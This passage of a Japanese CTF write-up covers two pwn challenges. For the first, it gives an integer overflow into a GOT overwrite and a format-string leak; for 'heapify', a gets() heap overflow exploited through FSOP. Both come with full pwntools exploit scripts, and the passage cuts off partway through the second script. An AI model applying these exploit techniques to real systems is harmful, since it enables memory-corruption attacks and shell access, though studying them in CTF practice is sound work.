+</span><span>        v4 = &amp;asc_2014[</span><span style="color:#d08770;">1</span><span>];
+</span><span>      </span><span style="color:#b48ead;">else
+</span><span>        v4 = &amp;asc_2014[</span><span style="color:#d08770;">2</span><span>];
+</span><span>      </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#d08770;">%s%s</span><span>&quot;, (</span><span style="color:#b48ead;">const char </span><span>*)v4, v3);
+</span><span>    }
+</span><span>    </span><span style="color:#96b5b4;">putchar</span><span>(</span><span style="color:#d08770;">10</span><span>);
+</span><span>  }
+</span><span>  </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">bye</span><span>&quot;);
+</span><span>  </span><span style="color:#96b5b4;">puts</span><span>(s);
+</span><span>  </span><span style="color:#b48ead;">return</span><span> v12 - </span><span style="color:#bf616a;">__readfsqword</span><span>(</span><span style="color:#d08770;">0x28</span><span style="color:#b48ead;">u</span><span>);
+</span><span>}
+</span></code></pre>
+<p>グローバル変数<code>arr</code>が存在して、<code>arr[v7]</code>に任意の値を設定することができます。</p>
+<h2 id="cui-ruo-xing-2">脆弱性</h2>
+<p>疑似コードの<code>v7</code>は無限にインクリメントすることができます。つまり、Integer Overflowがあります。<br />
+<code>__int16</code>であるため負数にすることができます。
+<code>arr[v7]</code>を(概ね)任意のアドレスにすることができるため、任意書き込みのプリミティブが得られます。</p>
+<h2 id="gong-ji-2">攻撃</h2>
+<p><code>arr</code>の近く(アドレスがより低い方)にはGOTエントリが存在します。<code>v7</code>
+をOverflowさせてGOTエントリを書き換えることができます。 <br />
+具体的には、<code>exit</code>を書き換えることで何度でもmainを呼び出せるようにします。加えて、<code>puts</code>
+がwhileループを抜けたあとにしか呼ばれないことを利用して、<code>puts</code>のGOTエントリを<code>printf@plt</code>に書き換えることで<code>puts(s)</code>
+においてFSB脆弱性を発生させることができます。
+\ 実際の攻撃手順は以下のとおりです。</p>
+<ol>
+<li><code>v7</code>をオーバーフローさせて<code>exit</code>と<code>puts</code>のGOTエントリをかきかえる。</li>
+<li><code>exit</code>を呼び出す(GOTの書き換えにより実際はmainを呼び出している)</li>
+<li>FSBを利用してlibc leak</li>
+<li>再び<code>v7</code>をオーバーフローさせて<code>puts</code>のGOTエントリを<code>system</code>に書き換える</li>
+<li><code>puts(s)</code>が<code>system('/bin/sh')</code>になり、シェルを取得</li>
+</ol>
+<h2 id="exploit-4">exploit</h2>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>context.arch = &quot;</span><span style="color:#a3be8c;">amd64</span><span>&quot;
+</span><span>context.bits = </span><span style="color:#d08770;">64
+</span><span>context.terminal = &quot;</span><span style="color:#a3be8c;">tmux splitw -h</span><span>&quot;.</span><span style="color:#bf616a;">split</span><span>()
+</span><span>context.log_level = &quot;</span><span style="color:#a3be8c;">INFO</span><span>&quot;
+</span><span>
+</span><span>s2sh = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">pl</span><span>: </span><span style="color:#b48ead;">b</span><span>&quot;&quot;.</span><span style="color:#bf616a;">join</span><span>([</span><span style="color:#bf616a;">p8</span><span>(</span><span style="color:#bf616a;">int</span><span>(pl[i: i + </span><span style="color:#d08770;">2</span><span>], </span><span style="color:#d08770;">16</span><span>)) </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#96b5b4;">len</span><span>(pl), </span><span style="color:#d08770;">2</span><span>)])
+</span><span>s2u64 = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">s</span><span>: </span><span style="color:#bf616a;">u64</span><span>(s.</span><span style="color:#bf616a;">ljust</span><span>(</span><span style="color:#d08770;">8</span><span>, </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x00</span><span>&quot;))
+</span><span>i2b = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>: </span><span style="color:#b48ead;">f</span><span>&quot;{x}&quot;.</span><span style="color:#bf616a;">encode</span><span>()
+</span><span>ptr_guard = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">pos</span><span>, </span><span style="color:#bf616a;">ptr</span><span>: (pos &gt;&gt; </span><span style="color:#d08770;">12</span><span>) ^ ptr
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">create_io</span><span>() -&gt; tubes.tube.tube:
+</span><span>    </span><span style="color:#b48ead;">if </span><span>not local:
+</span><span>        io: tubes.tube.tube = </span><span style="color:#bf616a;">remote</span><span>(remote_addr, </span><span style="color:#bf616a;">int</span><span>(remote_port))
+</span><span>    </span><span style="color:#b48ead;">elif </span><span>debug:
+</span><span>        </span><span style="color:#b48ead;">if </span><span>radare:
+</span><span>            io: tubes.tube.tube = </span><span style="color:#bf616a;">process</span><span>([elf_name], </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name})
+</span><span>            util.proc.</span><span style="color:#bf616a;">wait_for_debugger</span><span>(util.proc.</span><span style="color:#bf616a;">pidof</span><span>(io)[</span><span style="color:#d08770;">0</span><span>])
+</span><span>        </span><span style="color:#b48ead;">else</span><span>:
+</span><span>            io: tubes.tube.tube = gdb.</span><span style="color:#bf616a;">debug</span><span>([elf_name], script, </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name})
+</span><span>    </span><span style="color:#b48ead;">else</span><span>:
+</span><span>        io: tubes.tube.tube = </span><span style="color:#bf616a;">process</span><span>([elf_name], </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name})
+</span><span>    </span><span style="color:#b48ead;">return </span><span>io
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">solve</span><span>():
+</span><span>    </span><span style="color:#b48ead;">global </span><span>t
+</span><span>    sa = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>, </span><span style="color:#bf616a;">y</span><span>: t.</span><span style="color:#bf616a;">sendafter</span><span>(x, y)
+</span><span>    sla = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>, </span><span style="color:#bf616a;">y</span><span>: t.</span><span style="color:#bf616a;">sendlineafter</span><span>(x, y)
+</span><span>    </span><span style="color:#65737e;"># overwrite exit -&gt; main
+</span><span>    t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#96b5b4;">\x00</span><span>&#39;)
+</span><span>    </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0xffff </span><span>&amp; (~</span><span style="color:#d08770;">0x78 </span><span>+ </span><span style="color:#d08770;">1</span><span>)):
+</span><span>        t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">1</span><span>&#39;)
+</span><span>        </span><span style="color:#b48ead;">if </span><span>i % </span><span style="color:#d08770;">1000 </span><span>== </span><span style="color:#d08770;">999</span><span>:
+</span><span>            </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;{i</span><span style="color:#b48ead;">=</span><span>}&#39;)
+</span><span>            </span><span style="color:#65737e;"># time.sleep(0.5)
+</span><span>            </span><span style="color:#b48ead;">while </span><span>buf := t.</span><span style="color:#bf616a;">recv</span><span>(</span><span style="color:#bf616a;">timeout</span><span>=</span><span style="color:#d08770;">0.5</span><span>):
+</span><span>                </span><span style="color:#b48ead;">pass
+</span><span>    t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">2</span><span>&#39;)
+</span><span>    t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#bf616a;">p8</span><span>(</span><span style="color:#d08770;">0x76</span><span>))
+</span><span>    </span><span style="color:#b48ead;">for </span><span style="color:#bf616a;">_ </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0x38</span><span>):
+</span><span>        t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">1</span><span>&#39;)
+</span><span>    t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">2</span><span>&#39;)
+</span><span>    t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#bf616a;">p8</span><span>(</span><span style="color:#d08770;">0xb9</span><span>))
+</span><span>    t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">1</span><span>&#39;)
+</span><span>    t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">2</span><span>&#39;)
+</span><span>    t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#bf616a;">p8</span><span>(</span><span style="color:#d08770;">0x11</span><span>))
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">for </span><span style="color:#bf616a;">_ </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0x100 </span><span>- </span><span style="color:#d08770;">0xc1</span><span>):
+</span><span>        t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">1</span><span>&#39;)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">while </span><span style="color:#d08770;">True</span><span>:
+</span><span>        </span><span style="color:#b48ead;">if </span><span>not (buf := t.</span><span style="color:#bf616a;">recvn</span><span>(</span><span style="color:#d08770;">0x10001</span><span>, </span><span style="color:#bf616a;">timeout</span><span>=</span><span style="color:#d08770;">2</span><span>)):
+</span><span>            </span><span style="color:#b48ead;">break
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">if </span><span>debug:
+</span><span>        </span><span style="color:#96b5b4;">input</span><span>(&quot;</span><span style="color:#a3be8c;">OK?</span><span>&quot;)
+</span><span>    </span><span style="color:#65737e;"># second main
+</span><span>    t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">0</span><span>&#39;)
+</span><span>    </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">:</span><span>&#39;, </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">%41$p FIN</span><span>&#39;)
+</span><span>    t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">3</span><span>&#39;)
+</span><span>    </span><span style="color:#65737e;"># exit main
+</span><span>    buf = t.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">FIN</span><span>&#39;)
+</span><span>    buf = buf[buf.</span><span style="color:#bf616a;">rfind</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">0x</span><span>&#39;):buf.</span><span style="color:#bf616a;">rfind</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39; &#39;)]
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;{buf</span><span style="color:#b48ead;">=</span><span>}&#39;)
+</span><span>    libc_base = </span><span style="color:#bf616a;">int</span><span>(buf, </span><span style="color:#d08770;">16</span><span>) - </span><span style="color:#d08770;">171584
+</span><span>    libc.address = libc_base
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;{libc_base</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:x</span><span>}&quot;)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0xffff </span><span>&amp; (~</span><span style="color:#d08770;">0x78 </span><span>+ </span><span style="color:#d08770;">1</span><span>)):
+</span><span>        t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">1</span><span>&#39;)
+</span><span>        </span><span style="color:#b48ead;">if </span><span>i % </span><span style="color:#d08770;">2000 </span><span>== </span><span style="color:#d08770;">999</span><span>:
+</span><span>            </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;{i</span><span style="color:#b48ead;">=</span><span>}&#39;)
+</span><span>            </span><span style="color:#b48ead;">while </span><span>buf := t.</span><span style="color:#bf616a;">recv</span><span>(</span><span style="color:#bf616a;">timeout</span><span>=</span><span style="color:#d08770;">0.5</span><span>):
+</span><span>                </span><span style="color:#b48ead;">pass
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#bf616a;">p64</span><span>(libc.sym[&#39;</span><span style="color:#a3be8c;">system</span><span>&#39;]):
+</span><span>        t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">2</span><span>&#39;)
+</span><span>        t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#bf616a;">p8</span><span>(i))
+</span><span>        t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">1</span><span>&#39;)
+</span><span>
+</span><span>    t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">3</span><span>&#39;)
+</span><span>
+</span><span>    t.</span><span style="color:#bf616a;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span>local = </span><span style="color:#d08770;">1
+</span><span>debug = </span><span style="color:#d08770;">1
+</span><span>radare = </span><span style="color:#d08770;">0
+</span><span>
+</span><span>elf_name = &quot;</span><span style="color:#a3be8c;">./chall.p</span><span>&quot;
+</span><span>libc_name = &quot;</span><span style="color:#a3be8c;">./libc.so.6</span><span>&quot;
+</span><span>remote_addr, remote_port = &quot;</span><span style="color:#a3be8c;">challs.actf.co 31324</span><span>&quot;.</span><span style="color:#bf616a;">split</span><span>()
+</span><span style="color:#b48ead;">if </span><span>libc_name:
+</span><span>    libc: </span><span style="color:#bf616a;">ELF </span><span>= </span><span style="color:#bf616a;">ELF</span><span>(libc_name)
+</span><span>
+</span><span style="color:#b48ead;">while </span><span style="color:#d08770;">True</span><span>:
+</span><span>    elf: </span><span style="color:#bf616a;">ELF </span><span>= </span><span style="color:#bf616a;">ELF</span><span>(elf_name)
+</span><span>    script = &quot;&quot;&quot;
+</span><span style="color:#a3be8c;">    </span><span>&quot;&quot;&quot;
+</span><span>    t = </span><span style="color:#bf616a;">create_io</span><span>()
+</span><span>    </span><span style="color:#b48ead;">try</span><span>:
+</span><span>        </span><span style="color:#bf616a;">solve</span><span>()
+</span><span>    </span><span style="color:#b48ead;">except</span><span>:
+</span><span>        t.</span><span style="color:#bf616a;">close</span><span>()
+</span></code></pre>
+<h1 id="pwn-heapify">[pwn] heapify</h1>
+<h2 id="jie-xi-3">解析</h2>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>[*] &#39;/home/user/ctf/left_right/chall.p&#39;
+</span><span>    Arch:     amd64-64-little
+</span><span>    RELRO:    Partial RELRO
+</span><span>    Stack:    Canary found
+</span><span>    NX:       NX enabled
+</span><span>    PIE:      PIE enabled
+</span></code></pre>
+<p>普通のメモアプリのようです。<code>alloc</code>,<code>delete</code>,<code>view</code>が可能です。</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">stdio.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">unistd.h</span><span>&gt;
+</span><span>
+</span><span style="color:#b48ead;">#define </span><span>N </span><span style="color:#d08770;">32
+</span><span>
+</span><span style="color:#b48ead;">int</span><span> idx = </span><span style="color:#d08770;">0</span><span>;
+</span><span style="color:#b48ead;">char </span><span>*chunks[N];
+</span><span>
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">readint</span><span>() {
+</span><span>	</span><span style="color:#b48ead;">char</span><span> buf[</span><span style="color:#d08770;">0x10</span><span>];
+</span><span>	</span><span style="color:#bf616a;">read</span><span>(</span><span style="color:#d08770;">0</span><span>, buf, </span><span style="color:#d08770;">0x10</span><span>);
+</span><span>	</span><span style="color:#b48ead;">return </span><span style="color:#96b5b4;">atoi</span><span>(buf);
+</span><span>}
+</span><span>
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">alloc</span><span>() {
+</span><span>	</span><span style="color:#b48ead;">if</span><span>(idx &gt;= N) {
+</span><span>		</span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">you&#39;ve allocated too many chunks</span><span>&quot;);
+</span><span>		</span><span style="color:#b48ead;">return</span><span>;
+</span><span>	}
+</span><span>	</span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">chunk size: </span><span>&quot;);
+</span><span>	</span><span style="color:#b48ead;">int</span><span> size = </span><span style="color:#bf616a;">readint</span><span>();
+</span><span>	</span><span style="color:#b48ead;">char </span><span>*chunk = </span><span style="color:#96b5b4;">malloc</span><span>(size);
+</span><span>	</span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">chunk data: </span><span>&quot;);
+</span><span>
+</span><span>	</span><span style="color:#65737e;">// ----------
+</span><span>	</span><span style="color:#65737e;">// VULN BELOW !!!!!!
+</span><span>	</span><span style="color:#65737e;">// ----------
+</span><span>	</span><span style="color:#96b5b4;">gets</span><span>(chunk);
+</span><span>	</span><span style="color:#65737e;">// ----------
+</span><span>	</span><span style="color:#65737e;">// VULN ABOVE !!!!!!
+</span><span>	</span><span style="color:#65737e;">// ----------
+</span><span>
+</span><span>	</span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">chunk allocated at index: </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span>&quot;, idx);
+</span><span>	chunks[idx++] = chunk;
+</span><span>}
+</span><span>
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">delete</span><span>() {
+</span><span>	</span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">chunk index: </span><span>&quot;);
+</span><span>	</span><span style="color:#b48ead;">int</span><span> i = </span><span style="color:#bf616a;">readint</span><span>();
+</span><span>	</span><span style="color:#b48ead;">if</span><span>(i &gt;= N || i &lt; </span><span style="color:#d08770;">0 </span><span>|| !chunks[i]) {
+</span><span>		</span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">bad index</span><span>&quot;);
+</span><span>		</span><span style="color:#b48ead;">return</span><span>;
+</span><span>	}
+</span><span>	</span><span style="color:#96b5b4;">free</span><span>(chunks[i]);
+</span><span>	chunks[i] = </span><span style="color:#d08770;">0</span><span>;
+</span><span>}
+</span><span>
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">view</span><span>() {
+</span><span>	</span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">chunk index: </span><span>&quot;);
+</span><span>	</span><span style="color:#b48ead;">int</span><span> i = </span><span style="color:#bf616a;">readint</span><span>();
+</span><span>	</span><span style="color:#b48ead;">if</span><span>(i &gt;= N || i &lt; </span><span style="color:#d08770;">0 </span><span>|| !chunks[i]) {
+</span><span>		</span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">bad index</span><span>&quot;);
+</span><span>		</span><span style="color:#b48ead;">return</span><span>;
+</span><span>	}
+</span><span>	</span><span style="color:#96b5b4;">puts</span><span>(chunks[i]);
+</span><span>}
+</span><span>
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">menu</span><span>() {
+</span><span>	</span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">--- welcome 2 heap ---</span><span>&quot;);
+</span><span>	</span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">1) allocate</span><span>&quot;);
+</span><span>	</span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">2) delete</span><span>&quot;);
+</span><span>	</span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">3) view</span><span>&quot;);
+</span><span>}
+</span><span>
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span>() {
+</span><span>	</span><span style="color:#96b5b4;">setbuf</span><span>(stdout, </span><span style="color:#d08770;">0</span><span>);
+</span><span>	</span><span style="color:#bf616a;">menu</span><span>();
+</span><span>	</span><span style="color:#b48ead;">for</span><span>(;;) {
+</span><span>		</span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">your choice: </span><span>&quot;);
+</span><span>		</span><span style="color:#b48ead;">switch</span><span>(</span><span style="color:#bf616a;">readint</span><span>()) {
+</span><span>		</span><span style="color:#b48ead;">case </span><span style="color:#d08770;">1</span><span>:
+</span><span>			</span><span style="color:#bf616a;">alloc</span><span>();
+</span><span>			</span><span style="color:#b48ead;">break</span><span>;
+</span><span>		</span><span style="color:#b48ead;">case </span><span style="color:#d08770;">2</span><span>:
+</span><span>			</span><span style="color:#bf616a;">delete</span><span>();
+</span><span>			</span><span style="color:#b48ead;">break</span><span>;
+</span><span>		</span><span style="color:#b48ead;">case </span><span style="color:#d08770;">3</span><span>:
+</span><span>			</span><span style="color:#bf616a;">view</span><span>();
+</span><span>			</span><span style="color:#b48ead;">break</span><span>;
+</span><span>		</span><span style="color:#b48ead;">default</span><span>:
+</span><span>			</span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">exiting</span><span>&quot;);
+</span><span>			</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span>;
+</span><span>		}
+</span><span>	}
+</span><span>}
+</span></code></pre>
+<h2 id="cui-ruo-xing-3">脆弱性</h2>
+<p>ソースコードにもわかりやすく書いてある通り、<code>gets</code>が使われています。</p>
+<h2 id="gong-ji-3">攻撃</h2>
+<p>chunkのサイズを偽造してすでに存在するチャンクにかぶせて新しくチャンクをallocすることで、<code>view</code>を通したlibc、heap
+leakができます。</p>
+<ol>
+<li>heapをalloc</li>
+<li>heapのサイズを偽造してunsorted binに繋ぐ</li>
+<li>libc, heapをleak</li>
+<li>FSOPでshellを取得</li>
+</ol>
+<h2 id="exploit-5">exploit</h2>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>context.arch = &quot;</span><span style="color:#a3be8c;">amd64</span><span>&quot;
+</span><span>context.bits = </span><span style="color:#d08770;">64
+</span><span>context.terminal = &quot;</span><span style="color:#a3be8c;">tmux splitw -h</span><span>&quot;.</span><span style="color:#bf616a;">split</span><span>()
+</span><span>context.log_level = &quot;</span><span style="color:#a3be8c;">DEBUG</span><span>&quot;
+</span><span>
+</span><span>s2sh = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">pl</span><span>: </span><span style="color:#b48ead;">b</span><span>&quot;&quot;.</span><span style="color:#bf616a;">join</span><span>([</span><span style="color:#bf616a;">p8</span><span>(</span><span style="color:#bf616a;">int</span><span>(pl[i: i + </span><span style="color:#d08770;">2</span><span>], </span><span style="color:#d08770;">16</span><span>)) </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#96b5b4;">len</span><span>(pl), </span><span style="color:#d08770;">2</span><span>)])
+</span><span>s2u64 = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">s</span><span>: </span><span style="color:#bf616a;">u64</span><span>(s.</span><span style="color:#bf616a;">ljust</span><span>(</span><span style="color:#d08770;">8</span><span>, </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x00</span><span>&quot;))
+</span><span>i2b = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>: </span><span style="color:#b48ead;">f</span><span>&quot;{x}&quot;.</span><span style="color:#bf616a;">encode</span><span>()
+</span><span>ptr_guard = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">pos</span><span>, </span><span style="color:#bf616a;">ptr</span><span>: (pos &gt;&gt; </span><span style="color:#d08770;">12</span><span>) ^ ptr
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">create_io</span><span>() -&gt; tubes.tube.tube:
+</span><span>    </span><span style="color:#b48ead;">if </span><span>not local:
+</span><span>        io: tubes.tube.tube = </span><span style="color:#bf616a;">remote</span><span>(remote_addr, </span><span style="color:#bf616a;">int</span><span>(remote_port))
+</span><span>    </span><span style="color:#b48ead;">elif </span><span>debug:
+</span><span>        </span><span style="color:#b48ead;">if </span><span>radare:
+</span><span>            io: tubes.tube.tube = </span><span style="color:#bf616a;">process</span><span>([elf_name], </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name})
+</span><span>            util.proc.</span><span style="color:#bf616a;">wait_for_debugger</span><span>(util.proc.</span><span style="color:#bf616a;">pidof</span><span>(io)[</span><span style="color:#d08770;">0</span><span>])
+</span><span>        </span><span style="color:#b48ead;">else</span><span>:
+</span><span>            io: tubes.tube.tube = gdb.</span><span style="color:#bf616a;">debug</span><span>([elf_name], script, </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name})
+</span><span>    </span><span style="color:#b48ead;">else</span><span>:
+</span><span>        io: tubes.tube.tube = </span><span style="color:#bf616a;">process</span><span>([elf_name], </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name})
+</span><span>    </span><span style="color:#b48ead;">return </span><span>io
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">solve</span><span>():
+</span><span>    </span><span style="color:#b48ead;">global </span><span>t, libc
+</span><span>    sa = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>, </span><span style="color:#bf616a;">y</span><span>: t.</span><span style="color:#bf616a;">sendafter</span><span>(x, y)
+</span><span>    sla = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>, </span><span style="color:#bf616a;">y</span><span>: t.</span><span style="color:#bf616a;">sendlineafter</span><span>(x, y)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">alloc</span><span>(</span><span style="color:#bf616a;">_size</span><span>: int, </span><span style="color:#bf616a;">_data</span><span>: bytes = &#39;&#39;):
+</span><span>        </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">choice:</span><span>&#39;, </span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#d08770;">1</span><span>))
+</span><span>        </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">size: </span><span>&#39;, </span><span style="color:#bf616a;">i2b</span><span>(_size))
+</span><span>        </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">data: </span><span>&#39;, _data)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">delete</span><span>(</span><span style="color:#bf616a;">idx</span><span>: int):
+</span><span>        </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">choice:</span><span>&#39;, </span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#d08770;">2</span><span>))
+</span><span>        </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">index: </span><span>&#39;, </span><span style="color:#bf616a;">i2b</span><span>(idx))
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">view</span><span>(</span><span style="color:#bf616a;">idx</span><span>: int) -&gt; bytes:
+</span><span>        </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">choice:</span><span>&#39;, </span><span style="color:#bf616a;">i2b</span><span>(</span><span style="color:#d08770;">3</span><span>))
